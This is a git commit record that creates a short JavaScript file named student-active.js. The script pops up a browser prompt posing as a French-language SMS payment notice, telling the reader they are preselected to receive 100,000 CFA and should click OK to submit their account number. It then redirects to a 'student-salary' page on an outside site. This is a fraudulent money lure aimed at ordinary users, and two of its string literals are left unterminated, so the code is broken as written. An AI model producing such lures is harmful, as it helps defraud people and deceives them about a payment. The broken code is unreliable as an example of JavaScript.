8f7ea5660358f6ddb4672acdd6a043d0adf0f20c
bigukpe <bigaka42@gmail.com>
2025-03-25 12:19:13 +0100

    Create student-active.js

---
+++ student-active.js
@@ -0,0 +1,5 @@
+var password = 'Retirer 100 000 CFA'
+password=prompt('SMS: Paiement en cours. Vous êtes parmi les candidats présélectionnés pour recevoir 100 000 CFA. Veuillez cliquer sur OK pour soumettre votre numéro de compte. ','Retirer 100 000 CFA);
+if (password != 'Retirer 100 000 CFA) {
+location.href='https://learnlivetech.org/student-salary';
+}
